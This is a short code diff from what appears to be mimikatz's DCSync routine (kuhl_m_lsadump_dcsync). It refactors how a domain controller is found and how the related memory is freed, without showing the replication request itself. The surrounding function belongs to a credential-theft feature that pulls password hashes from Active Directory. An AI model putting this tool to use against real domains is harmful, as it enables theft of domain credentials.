@@ -1714,7 +1714,6 @@ NTSTATUS kuhl_m_lsadump_dcsync(int argc, wchar_t * argv[])
 {
 	LSA_OBJECT_ATTRIBUTES objectAttributes = {0};
 	PPOLICY_DNS_DOMAIN_INFO pPolicyDnsDomainInfo = NULL;
-	PDOMAIN_CONTROLLER_INFO cInfo = NULL;
 	RPC_BINDING_HANDLE hBinding;
 	DRS_HANDLE hDrs = NULL;
 	DSNAME dsName = {0};
@@ -1722,8 +1721,8 @@ NTSTATUS kuhl_m_lsadump_dcsync(int argc, wchar_t * argv[])
 	DWORD dwOutVersion = 0;
 	DRS_MSG_GETCHGREPLY getChRep = {0};
 	ULONG drsStatus;
-	DWORD ret;
 	LPCWSTR szUser = NULL, szGuid = NULL, szDomain = NULL, szDc = NULL;
+	LPWSTR szTmpDc = NULL;
 
 	if(!kull_m_string_args_byName(argc, argv, L"domain", &szDomain, NULL))
 		if(kull_m_net_getCurrentDomainInfo(&pPolicyDnsDomainInfo))
@@ -1733,12 +1732,8 @@ NTSTATUS kuhl_m_lsadump_dcsync(int argc, wchar_t * argv[])
 	{
 		kprintf(L"[DC] \'%s\' will be the domain\n", szDomain);
 		if(!(kull_m_string_args_byName(argc, argv, L"dc", &szDc, NULL) || kull_m_string_args_byName(argc, argv, L"kdc", &szDc, NULL)))
-		{
-			ret = DsGetDcName(NULL, szDomain, NULL, NULL, DS_DIRECTORY_SERVICE_REQUIRED | DS_IS_DNS_NAME | DS_RETURN_DNS_NAME, &cInfo);
-			if(ret == ERROR_SUCCESS)
-				szDc = cInfo->DomainControllerName + 2;
-			else PRINT_ERROR(L"[DC] DsGetDcName: %u\n", ret);
-		}
+			if(kull_m_net_getDC(szDomain, DS_DIRECTORY_SERVICE_REQUIRED, &szTmpDc))
+				szDc = szTmpDc;
 
 		if(szDc)
 		{
@@ -1795,8 +1790,8 @@ NTSTATUS kuhl_m_lsadump_dcsync(int argc, wchar_t * argv[])
 	}
 	else PRINT_ERROR(L"Domain not present, or doesn\'t look like a FQDN\n");
 
-	if(cInfo)
-		NetApiBufferFree(cInfo);
+	if(szTmpDc)
+		LocalFree(szTmpDc);
 	if(pPolicyDnsDomainInfo)
 		LsaFreeMemory(pPolicyDnsDomainInfo);
 
